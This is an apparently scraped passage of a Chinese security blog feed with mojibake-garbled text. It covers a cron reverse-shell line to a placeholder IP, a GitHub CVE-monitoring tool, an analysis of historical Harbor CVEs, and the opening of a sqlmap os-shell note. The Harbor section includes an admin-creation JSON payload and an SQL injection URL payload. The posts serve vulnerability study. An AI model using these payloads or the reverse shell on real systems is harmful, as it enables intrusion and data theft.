<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">*/1 * * * * bash -c <span class="string">&quot;bash -i &gt;&amp;/dev/tcp/xx.xx.xx.xx/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x04-å‚è€ƒ"><a href="#0x04-å‚è€ƒ" class="headerlink" title="0x04 å‚è€ƒ"></a>0x04 å‚è€ƒ</h2><p><a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
<p><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> </p>
<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
        <category>èœœç½</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>èœœç½</tag>
      </tags>
  </entry>
  <entry>
    <title>gitHub_cve_monitor</title>
    <url>/2021/02/25/github_cve_monitor/</url>
    <content><![CDATA[<blockquote>
<p>æ²¡äº‹å°‘çŸ«æƒ…ï¼Œæœ‰ç©ºå¤šèµšé’±ã€‚</p>
</blockquote>
<h2 id="ç›‘æ§githubä¸Šæ–°å¢çš„cveç¼–å·é¡¹ç›®æ¼æ´ï¼Œæ¨é€é’‰é’‰æˆ–è€…serveré…±"><a href="#ç›‘æ§githubä¸Šæ–°å¢çš„cveç¼–å·é¡¹ç›®æ¼æ´ï¼Œæ¨é€é’‰é’‰æˆ–è€…serveré…±" class="headerlink" title="ç›‘æ§githubä¸Šæ–°å¢çš„cveç¼–å·é¡¹ç›®æ¼æ´ï¼Œæ¨é€é’‰é’‰æˆ–è€…serveré…±"></a>ç›‘æ§githubä¸Šæ–°å¢çš„cveç¼–å·é¡¹ç›®æ¼æ´ï¼Œæ¨é€é’‰é’‰æˆ–è€…serveré…±</h2><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m pip install dingtalkchatbot</span><br><span class="line">python3 github_cve_monitor.py</span><br></pre></td></tr></table></figure>

<p>æ¯3åˆ†é’Ÿæ£€æµ‹ä¸€æ¬¡githubæ˜¯å¦æœ‰æ–°çš„cveæ¼æ´æäº¤è®°å½•ï¼Œè‹¥æœ‰åˆ™é€šè¿‡serveré…±å’Œé’‰é’‰æœºå™¨äººæ¨é€ï¼ˆäºŒè€…é…ç½®ä¸€ä¸ªå³å¯ï¼‰</p>
<p>æ—¶é—´é—´éš”ä¿®æ”¹åœ¨ 58 è¡Œ</p>
<p>å»ºè®®ä½¿ç”¨<a href="https://www.runoob.com/linux/linux-comm-screen.html">screenå‘½ä»¤</a>è¿è¡Œåœ¨è‡ªå·±çš„linux vpsåå°ä¸Šï¼Œå°±å¯ä»¥æ„‰å¿«çš„æ¥æ”¶å„ç§cveäº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -S github_cve	<span class="comment">#åˆ›å»ºä¸€ä¸ªscreenï¼Œåå­—ä¸ºgithub_cveï¼Œåœ¨æ–°çª—å£è¿è¡Œæœ¬é¡¹ç›®, æˆåŠŸåç›´æ¥å‰æ‰è¯¥çª—å£, é¡¹ç›®å°±ä¼šåœ¨åå°ä¸€ç›´è¿è¡Œäº†</span></span><br><span class="line"></span><br><span class="line">screen -<span class="built_in">ls</span> 		<span class="comment">#æŸ¥çœ‹åˆ›å»ºçš„screen</span></span><br><span class="line"></span><br><span class="line">screen -r github_cve	<span class="comment">#è¿æ¥github_cveåå°screenï¼Œå¦‚æœå­˜åœ¨çš„è¯</span></span><br></pre></td></tr></table></figure>



<p>é’‰é’‰æœºå™¨äººé…ç½®åœ¨ 33è¡Œçš„ dingdingå‡½æ•°ä¸­ï¼Œéœ€è¦é’‰é’‰å»ºç¾¤ï¼Œæ·»åŠ é’‰é’‰æœºå™¨äººï¼Œå¤åˆ¶ webhook æ›¿æ¢å³å¯</p>
<p>serveré…±é…ç½®åœ¨ 40è¡Œçš„ server å‡½æ•°ä¸­ï¼Œpsï¼šå› å¾®ä¿¡çš„åŸå› ï¼Œserveré…±çš„æ—§ç‰ˆå°†åœ¨2021å¹´4æœˆåä¸‹çº¿ï¼Œæ–°ç‰ˆä»¥ä¼ä¸šå¾®ä¿¡ä¸ºä¸»ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯æ—§ç‰ˆï¼Œæƒ³æ”¹æ–°ç‰ˆçš„è¯ï¼Œæä¸ªä¼ä¸šå¾®ä¿¡ï¼Œä»æ–°é…ç½®serveré…±ï¼Œä½¿ç”¨æ–°é“¾æ¥ sctapi.ftqq.com</p>
<p>å…·ä½“æŸ¥çœ‹serveré…±å®˜æ–¹ï¼Œ<a href="http://sc.ftqq.com/">http://sc.ftqq.com/</a> ï¼Œé…ç½®ç®€å•ï¼Œåªéœ€è¦å°†è„šæœ¬ä¸­çš„uriæ¢æ‰å³å¯</p>
<p><a href="https://sct.ftqq.com/">serveré…±æ–°ç‰ˆ</a>æ”¯æŒå¤šé€šé“ï¼ˆå¾®ä¿¡ã€å®¢æˆ·ç«¯ã€ç¾¤æœºå™¨äººã€é‚®ä»¶å’ŒçŸ­ä¿¡ï¼‰</p>
<h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225093627.png" alt="image-20210225090416314"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225094630.jpg" alt="751614217534_.pic"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225093635.png" alt="image-20210225092350481"></p>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li>æ´›ç±³å”¯ç†Š 	<a href="https://my.oschina.net/u/4581868/blog/4380482">https://my.oschina.net/u/4581868/blog/4380482</a></li>
<li>kiang70      <a href="https://github.com/kiang70/Github-Monitor">https://github.com/kiang70/Github-Monitor</a></li>
</ul>
]]></content>
      <categories>
        <category>GitHubå·¥å…·</category>
      </categories>
      <tags>
        <tag>GitHubå·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>harborå†å²æ¼æ´åˆ†æ</title>
    <url>/2023/02/18/harbor%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>  ä»Šå¹´å¤šå†™æ–‡ç« ï¼Œå…ˆæŠŠå»å¹´çš„æ¸…ç†ä¸€ä¸‹</p>
</blockquote>
<h1 id="Harbor"><a href="#Harbor" class="headerlink" title="Harbor"></a>Harbor</h1><p>Harboræ˜¯VMwareå…¬å¸å¼€æºçš„ä¼ä¸šçº§Docker Registryé¡¹ç›®ï¼Œç”¨æ¥å¸®åŠ©ç”¨æˆ·è¿…é€Ÿæ­å»ºä¸€ä¸ªä¼ä¸šçº§çš„Docker RegistryæœåŠ¡ã€‚</p>
<p>å®ƒä»¥Dockerå…¬å¸å¼€æºçš„registryä¸ºåŸºç¡€ï¼Œæä¾›äº†ç®¡ç†UIï¼ŒåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶(Role Based Access Control)ï¼ŒAD&#x2F;LDAPé›†æˆã€ä»¥åŠå®¡è®¡æ—¥å¿—(Auditlogging) ç­‰ä¼ä¸šç”¨æˆ·éœ€æ±‚çš„åŠŸèƒ½ï¼ŒåŒæ—¶è¿˜åŸç”Ÿæ”¯æŒä¸­æ–‡ã€‚</p>
<h1 id="å†å²æ¼æ´"><a href="#å†å²æ¼æ´" class="headerlink" title="å†å²æ¼æ´"></a>å†å²æ¼æ´</h1><h2 id="CVE-2019-16097"><a href="#CVE-2019-16097" class="headerlink" title="CVE-2019-16097"></a>CVE-2019-16097</h2><p>æ¼æ´ç‰ˆæœ¬ 1.7.0 to 1.7.5 and 1.8.0 to 1.8.2</p>
<blockquote>
<p>Harbour 1.7.0 åˆ° 1.8.2 ä¸­çš„ <code>core/api/user.go</code> å…è®¸éç®¡ç†å‘˜ç”¨æˆ·é€šè¿‡ POST <code>/api/users</code> API åˆ›å»ºç®¡ç†å‘˜å¸æˆ·</p>
</blockquote>
<p>ç›¸å…³ä»£ç ï¼Œç›´æ¥è§£æä¼ æ¥çš„æ•°æ®</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224677.png" alt="image-20221019141407512"></p>
<p>æ­£å¸¸æ³¨å†Œæ•°æ®</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;test123@gmai.com&quot;</span><span class="punctuation">,</span><span class="attr">&quot;realname&quot;</span><span class="punctuation">:</span><span class="string">&quot;noname&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;Password1@11&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>éé¢„æœŸï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;test123@gmai.com&quot;</span><span class="punctuation">,</span><span class="attr">&quot;realname&quot;</span><span class="punctuation">:</span><span class="string">&quot;noname&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;Password1@11&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;has_admin_role&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>has_admin_role</code> ä»£è¡¨æ˜¯å¦ä¸ºç®¡ç†å‘˜ï¼Œç›´æ¥åˆ›å»ºç®¡ç†å‘˜ç”¨æˆ·</p>
<p>ä¿®å¤ä»£ç ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224489.png" alt="image-20221019141923017"></p>
<h2 id="CVE-2019-16919"><a href="#CVE-2019-16919" class="headerlink" title="CVE-2019-16919"></a>CVE-2019-16919</h2><p>æ¼æ´ç‰ˆæœ¬ï¼š1.8.0 to 1.8.3 and 1.9.0</p>
<blockquote>
<p>è¯¥æ¼æ´å…è®¸é¡¹ç›®ç®¡ç†å‘˜ä½¿ç”¨ Harbor API åˆ›å»ºä¸€ä¸ªæœºå™¨äººå¸æˆ·ï¼Œè¯¥å¸æˆ·å¯¹ä»–ä»¬æ— æƒè®¿é—®æˆ–æ§åˆ¶çš„é¡¹ç›®å…·æœ‰æœªç»æˆæƒçš„æ¨é€æˆ–æ‹‰å–è®¿é—®æƒé™ã€‚Harbor API æ²¡æœ‰å¯¹ API è¯·æ±‚å¼ºåˆ¶æ‰§è¡Œé€‚å½“çš„é¡¹ç›®æƒé™å’Œé¡¹ç›®èŒƒå›´ä»¥åˆ›å»ºæ–°çš„æœºå™¨äººå¸æˆ·ã€‚</p>
</blockquote>
<p><code>src/core/api/robot.go</code>å¯¹æ¯”ï¼Œå°±æ˜¯åŠ äº†ä¸€ä¸ªåˆ¤æ–­ï¼Œéœ€è¦ç®¡ç†å‘˜åˆ›å»ºæ²¡å•¥è¯´çš„<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224173.png" alt="image-20221019144856634"></p>
<p><a href="https://github.com/goharbor/harbor/commit/debf63bcbd17bbeacb4a354de0457684f4ecaa5a">https://github.com/goharbor/harbor/commit/debf63bcbd17bbeacb4a354de0457684f4ecaa5a</a></p>
<h2 id="CVE-2019-19023"><a href="#CVE-2019-19023" class="headerlink" title="CVE-2019-19023"></a>CVE-2019-19023</h2><p>æ¼æ´ç‰ˆæœ¬ 1.7.*, 1.8.*, &lt; 1.9.3</p>
<blockquote>
<p>  è¯¥æ¼æ´å…è®¸æ™®é€šç”¨æˆ·é€šè¿‡è°ƒç”¨ API æ¥ä¿®æ”¹ç‰¹å®šç”¨æˆ·çš„ç”µå­é‚®ä»¶åœ°å€ï¼Œä»è€Œè·å¾—ç®¡ç†å‘˜å¸æˆ·æƒé™ã€‚ä¹‹åé‡ç½®è¯¥ç”µå­é‚®ä»¶åœ°å€çš„å¯†ç å¹¶è®¿é—®è¯¥å¸æˆ·ã€‚</p>
</blockquote>
<p><code>src/core/api/user.go</code>ä¿®å¤å‰åå¯¹æ¯”</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224226.png" alt="image-20221019163318792"></p>
<p>ä¿®å¤å‰æ˜¯å…ˆèµ‹å€¼ï¼Œåå°†ç”¨æˆ·è¾“å…¥è½¬æ¢ä¸º jsonï¼Œè¿™æ—¶ <code>userID</code> å°±ä¼šè¢«è¦†ç›–ä¿®æ”¹ä¸ºç”¨æˆ·è¾“å…¥çš„ idï¼Œå¯æ§ï¼Œè¿™æ ·å°±å¯ä»¥ä¿®æ”¹ç®¡ç†å‘˜çš„é‚®ç®±ï¼Œä¹‹åå†è¿›è¡Œé‡ç½®å¯†ç æ“ä½œï¼Œç™»å½•ç®¡ç†å‘˜ï¼›</p>
<p>ä¿®å¤åæ˜¯å…ˆè½¬æ¢ï¼Œåèµ‹å€¼ï¼Œ<code>userID</code>è¿˜æ˜¯å½“å‰ç™»å½•ç”¨æˆ·çš„idï¼Œä¸å¯æ§ï¼›</p>
<h2 id="cve-2019-xxx"><a href="#cve-2019-xxx" class="headerlink" title="cve-2019-xxx"></a>cve-2019-xxx</h2><p>CVE-2019-3990ã€CVE-2020-13794 éç®¡ç†å‘˜å¯ä»¥è¿›è¡Œç”¨æˆ·åæšä¸¾,</p>
<p>CVE-2019-19025 æ²¡æœ‰ csrf ä¿æŠ¤</p>
<p>CVE-2019-19030 æœªæˆæƒä¿¡æ¯æ¢æµ‹</p>
<p>1.7.*, 1.8.*, 1.9.*, &lt;2.0.1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/api/chartrepo/&#123;repo&#125;/prov (POST)</span><br><span class="line">/api/chartrepo/&#123;repo&#125;/charts (GET, POST)</span><br><span class="line">/api/chartrepo/&#123;repo&#125;/charts/&#123;name&#125; (GET, DELETE)</span><br><span class="line">/api/chartrepo/&#123;repo&#125;/charts/&#123;name&#125;/&#123;version&#125; (GET, DELETE)</span><br><span class="line">/api/labels?name=&#123;name&#125;&amp;scope=p (GET)</span><br><span class="line">/api/repositories?project_id=&#123;id&#125; (GET)</span><br><span class="line">/api/repositories/&#123;repo_name&#125;/ (GET, PUT, DELETE)</span><br><span class="line">/api/repositories/&#123;repo_name&#125;/tags (GET)</span><br><span class="line">/api/repositories/&#123;repo_name&#125;/tags/&#123;tag&#125;/manifest?version=&#123;version&#125; (GET)</span><br><span class="line">/api/repositories/&#123;repo_name/&#123;tag&#125;/labels (GET)</span><br><span class="line">/api/projects?project_name=&#123;name&#125; (HEAD)</span><br><span class="line">/api/projects/&#123;project_id&#125;/summary (GET)</span><br><span class="line">/api/projects/&#123;project_id&#125;/logs (GET)</span><br><span class="line">/api/projects/&#123;project_id&#125; (GET, PUT, DELETE)</span><br><span class="line">/api/projects/&#123;project_id&#125;/metadatas (GET, POST)</span><br><span class="line">/api/projects/&#123;project_id&#125;/metadatas/&#123;metadata_name&#125; (GET, PUT)</span><br></pre></td></tr></table></figure>



<h2 id="CVE-2019-19026"><a href="#CVE-2019-19026" class="headerlink" title="CVE-2019-19026"></a>CVE-2019-19026</h2><p>æ¼æ´ç‰ˆæœ¬ï¼š 1.7.*ã€&lt;1.8.6ã€&lt;1.9.3</p>
<blockquote>
<p>  Harbor APIçš„é…é¢éƒ¨åˆ†ä¸­å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚ç»è¿‡èº«ä»½éªŒè¯çš„ç®¡ç†å‘˜å¯ä»¥é€šè¿‡GETå‚æ•°æ’åºå‘é€å·§å°½å¿ƒæ€æ„å»ºçš„SQLè´Ÿè½½ï¼Œä»è€Œå…è®¸ä»æ•°æ®åº“ä¸­æå–æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p>  Ps : å®˜æ–¹ç‰ˆæœ¬è¯´çš„æ ¹æœ¬ä¸å¯¹ï¼Œquota_usage è¿™ä¸ªæ–‡ä»¶ 1.9.0 æ‰å‡ºç°</p>
</blockquote>
<p><code>git checkout v1.9.0</code></p>
<p><code>src/common/dao/quota.go</code> </p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224706.png" alt="image-20221024105920943"></p>
<p>Payload </p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://xxxxxx/api/quotas?reference=project&amp;page=1&amp;page_size=15&amp;sort=used.count%27%7C%7C(case+when+version()like+%27Postgre%25%27+then+1+else+(select+1+union+select+2)+end)%7C%7C%27</span><br></pre></td></tr></table></figure>

<h3 id="CodeQL"><a href="#CodeQL" class="headerlink" title="CodeQL"></a>CodeQL</h3><p>ç”Ÿæˆæ•°æ®åº“<code>codeql database create ./harbor1.9.0 -s /Users/yhy/Documents/CloudNative/harbor/code/harbor/src --language=go</code> ps: è¦æŒ‡å®šæºæ–‡ä»¶ä¸º src ç›®å½•ä¸‹ï¼Œè™½ç„¶ä¸Šçº§ç›®å½•æœ‰ makefileï¼Œä½†ç”Ÿæˆæ—¶æ²¡æœ‰è¿è¡Œ makefileï¼Œå¯¼è‡´ç”Ÿæˆåçš„æ•°æ®åº“æœ‰é—®é¢˜,sink ç‚¹ç¼ºå¤±å¾ˆå¤šã€‚</p>
<p>è¿˜æœ‰å°±æ˜¯ Harbor ä½¿ç”¨çš„æ˜¯<code>beego</code>æ¡†æ¶ï¼Œè¯¥æ¡†æ¶æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼ŒCodeql ä¸­çš„<code>BeegoOrm</code>åªå†™äº†ä¸€ç§ï¼Œåœ¨<code>go/ql/lib/semmle/go/frameworks/BeegoOrm.qll</code>æ·»åŠ å¦‚ä¸‹ä»£ç :</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224894.png" alt="image-20221201200001309"></p>
<p>ä½¿ç”¨å®˜æ–¹çš„<code>ql/src/Security/CWE-089/SqlInjection.ql</code>æŸ¥è¯¢è§„åˆ™ï¼Œsink å’Œ source å•ç‹¬éƒ½èƒ½è·‘å‡ºæ¥ï¼Œä½†æ˜¯ç»“åˆåˆ°ä¸€èµ·ï¼Œæ— æ³•æ‰¾å‡ºæ³¨å…¥ç‚¹ï¼Œç»åˆ†æå¤§æ¦‚æ˜¯å› ä¸º<code>...</code>é€ æˆæ•°æ®æµä¸­æ–­</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182225738.png" alt="image-20221025221621454"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Auth Chris Smowton</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">private predicate <span class="title function_">isVarargsParam</span><span class="params">(Parameter p)</span> &#123;</span><br><span class="line">  exists(ParameterDecl pd, FuncTypeExpr tp | pd = tp.getAParameterDecl() |</span><br><span class="line">    p.getDeclaration() = pd.getANameExpr() and</span><br><span class="line">    pd.getTypeExpr() instanceof Ellipsis</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaintConfig</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">  TaintConfig() &#123; this = <span class="string">&quot;taint-configuration&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node source, DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Parameter p, DataFlow::ArgumentNode an, <span class="type">int</span> idx |</span><br><span class="line">      an = source and</span><br><span class="line">      p = an.getCall().getACallee().getAParameter() and</span><br><span class="line">      isVarargsParam(p) and</span><br><span class="line">      not an.getCall().hasEllipsis() and</span><br><span class="line">      an.argumentOf(_, idx) and</span><br><span class="line">      idx &gt;= p.getIndex() and</span><br><span class="line">      sink.asParameter() = p</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·è™½ç„¶å¯ä»¥è·Ÿè¸ªéšå¼æ•°ç»„ï¼Œä½†åªæœ‰å½“æ•°ç»„æœ¬èº«ä¸ºæ±¡æŸ“æºæ‰è¡Œï¼Œå¯¹å…¶å†…çš„æŸä¸ªå…ƒç´ ä¸èµ·ä½œç”¨ã€‚</p>
<h2 id="CVE-2019-19029"><a href="#CVE-2019-19029" class="headerlink" title="CVE-2019-19029"></a>CVE-2019-19029</h2><p>æ¼æ´ç‰ˆæœ¬ï¼š 1.7.*ã€&lt;1.8.6ã€&lt;1.9.3</p>
<blockquote>
<p>å…·æœ‰é¡¹ç›®ç®¡ç†èƒ½åŠ›çš„ç”¨æˆ·å¯ä»¥åˆ©ç”¨å’Œåˆ©ç”¨SQLæ³¨å…¥ä»åº•å±‚æ•°æ®åº“è¯»å–æœºå¯†æˆ–æ‰§è¡Œæƒé™æå‡ã€‚</p>
</blockquote>
<p><code>src/core/auth/authproxy/auth.go</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182225446.png" alt="image-20221026105816087"></p>
<p><code>src/common/dao/group/usergroup.go</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226507.png" alt="image-20221026110058779"></p>
<p>è¿™ä¸ªé—®é¢˜çœ‹ä»£ç æ˜¯å½“ç”¨æˆ·éªŒè¯ä¸º<code>AuthProxy/OIDC</code>æ—¶ï¼Œæ§åˆ¶è¯·æ±‚è¿”å›å€¼æ„é€  sql æ³¨å…¥ </p>
<h2 id="CVE-2020-13788"><a href="#CVE-2020-13788" class="headerlink" title="CVE-2020-13788"></a>CVE-2020-13788</h2><p>æ¼æ´ç‰ˆæœ¬ï¼š 1.8.*ã€1.9.*ã€&lt;2.0.1</p>
<blockquote>
<p>ä¸€ä¸ªæœ‰é™çš„æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€  (SSRF)ï¼Œå®ƒå…è®¸ Harbor é¡¹ç›®æ‰€æœ‰è€…æ‰«æ Harbor æœåŠ¡å™¨å†…éƒ¨ç½‘ç»œä¸Šä¸»æœºçš„ TCP ç«¯å£ã€‚</p>
</blockquote>
<p><code>src/common/utils/registry/repository.go</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182225933.png" alt="image-20221026154810093"></p>
<p>codeql å¯ä»¥è·‘å‡ºæ¥</p>
<p>å½“åˆ›å»ºé¡¹ç›®åï¼Œæ·»åŠ  webhook éœ€è¦æŒ‡å®š<code>Endpoint URL</code>å¯¼è‡´çš„æœ‰é™ SSRF</p>
<h2 id="CVE-2020-29662"><a href="#CVE-2020-29662" class="headerlink" title="CVE-2020-29662"></a>CVE-2020-29662</h2><p>æ¼æ´ç‰ˆæœ¬ï¼š 2.0.0&gt; x &lt;2.0.5ã€&lt;2.1.2</p>
<blockquote>
<p>  api æƒé™ç»•è¿‡ï¼Œ<code>/v2/_catalog</code> æœ¬æ„éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œä½†æ­£åˆ™å†™çš„æœ‰é—®é¢˜å¯¼è‡´å¯ä»¥ä½¿ç”¨ <code>/v2/_catalog/ </code>ç»•è¿‡</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226578.png" alt="image-20221026155946894"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226471.png" alt="image-20221026160127001"></p>
<p>ä¿®å¤<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226728.png" alt="image-20221026160301763"></p>
<h2 id="CVE-2022-xxx"><a href="#CVE-2022-xxx" class="headerlink" title="CVE-2022-xxx"></a>CVE-2022-xxx</h2><p>CVE-2022-31667 <code>æœºå™¨äººæƒé™å¯ä»¥è¢«æ— æƒè®¿é—®çš„ç”¨æˆ·å…³é—­</code> <code>PUT /robots/&#123;robot_id&#125;</code></p>
<p>CVE-2022-31669  <code>æ›´æ–°æ ‡ç­¾ä¸å˜æ€§ç­–ç•¥æ—¶ï¼Œæ²¡æœ‰éªŒè¯ç”¨æˆ·æƒé™</code>  <code>PUT /projects/&#123;project_name_or_id&#125;/immutabletagrules/&#123;immutable_rule_id&#125;</code></p>
<p>CVE-2022-31670 <code>æ›´æ–°æ ‡ç­¾ä¿ç•™ç­–ç•¥æ—¶ï¼Œæ²¡æœ‰éªŒè¯ç”¨æˆ·æƒé™</code>  <code>PUT /retentions/&#123;id&#125;</code></p>
<p>CVE-2022-31666  <code> æŸ¥çœ‹/æ›´æ–°/åˆ é™¤ Webhookæ—¶ï¼Œæ²¡æœ‰éªŒè¯ç”¨æˆ·æƒé™</code>   <code>GET/PUT/DELETE /projects/&#123;project_name_or_id&#125;/webhook/policies/&#123;webhook_policy_id&#125;</code> </p>
<p>CVE-2022-31671  <code>æ›´æ–°/æŸ¥çœ‹P2P preheat execution æ—¥å¿—æ²¡æœ‰éªŒè¯ç”¨æˆ·æƒé™</code> <code>GET /projects/&#123;project_name&#125;/preheat/policies/&#123;preheat_policy_name&#125;/executions/&#123;execution_id&#125;/tasks/&#123;task_id&#125;/logs</code></p>
<p><code>PUT /projects/&#123;project_name&#125;/preheat/policies/&#123;preheat_policy_name&#125;</code></p>
<p>è¿™ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ - CNCF</category>
      </categories>
      <tags>
        <tag>æ¼æ´åˆ†æ</tag>
        <tag>CNCF</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmapå…³äºos-shellå°è®°</title>
    <url>/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="SqlMap-â€“os-shell-åˆ©ç”¨"><a href="#SqlMap-â€“os-shell-åˆ©ç”¨" class="headerlink" title="SqlMap â€“os-shell åˆ©ç”¨"></a>SqlMap â€“os-shell åˆ©ç”¨</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h3><ol>
<li><p>æ‹¥æœ‰dbaæƒé™</p>
</li>
<li><p>ç½‘ç«™çš„ç»å¯¹è·¯å¾„</p>
</li>
<li><p>é«˜ç‰ˆæœ¬çš„mysqléœ€è¦ <code>show variables like &#39;%secure_file_priv%&#39;</code> æˆ–è€…<code>select </code></p>
<p> <code>@@secure;</code>æˆ–è€…<code>show global variables like &#39;%secure%&#39;;</code>çš„ç»“æœç¬¦åˆè¦æ±‚ï¼Œsecure-file-privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA, SELECT â€¦ OUTFILE, and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚è¿™ä¸ªå‚æ•°åªèƒ½é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶åé‡å¯mysqlä¿®æ”¹</p>
<ul>
<li>å¦‚æœè¯¥å˜é‡ä¸ºç©ºï¼Œåˆ™å˜é‡æ— æ•ˆï¼Œè¿™æ—¶å€™æœ€å®¹æ˜“åˆ©ç”¨</li>
<li>å¦‚æœå˜é‡ä¸ºç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œåˆ™æœåŠ¡å™¨ä¼šå°†å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œé™åˆ¶ä¸ºä»…é€‚ç”¨äºè¯¥ç›®å½•ä¸­çš„æ–‡ä»¶</li>
<li>å¦‚æœè®¾ç½®ä¸ºNULLï¼Œåˆ™æœåŠ¡å™¨ç¦ç”¨å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œã€‚</li>
</ul>
</li>
